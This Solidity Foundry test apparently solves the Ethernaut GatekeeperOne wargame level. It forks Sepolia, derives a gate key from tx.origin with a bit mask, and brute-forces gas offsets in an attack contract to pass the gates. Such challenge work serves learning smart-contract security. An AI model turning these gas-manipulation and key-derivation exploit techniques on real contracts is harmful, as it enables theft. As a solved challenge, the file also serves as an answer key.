// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import "../src/levels/13-GatekeeperOne/GatekeeperOne.sol";

contract ContractTest is Test {
    AttackContract attackContract;
    GatekeeperOne level13 =
        GatekeeperOne(payable(0x0eDF7E447741A21ED33F14C13842639910F36c8b));

    function setUp() public {
        Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
        vm.createSelectFork(vm.rpcUrl("sepolia"));

        vm.label(address(this), "Attacker");
        vm.label(
            address(0x0eDF7E447741A21ED33F14C13842639910F36c8b),
            "Ethernaut13"
        );
        attackContract = new AttackContract();
    }

    function testEthernaut13() public {
        attackContract.enter();
    }

    receive() external payable {}
}

contract AttackContract {
    GatekeeperOne level13 =
        GatekeeperOne(payable(0x0eDF7E447741A21ED33F14C13842639910F36c8b));

    function enter() public {
        bytes8 _gateKey = bytes8(uint64(uint160(tx.origin))) &
            0xffffffff0000ffff;
        for (uint256 i = 0; i < 300; i++) {
            (bool result, ) = address(level13).call{gas: i + 8191 * 3}(
                abi.encodeWithSignature("enter(bytes8)", _gateKey)
            );
            if (result) {
                // example: i = 256 with key 0x83f33e0700001f38
                console.log(i);
                break;
            }
        }
    }
}
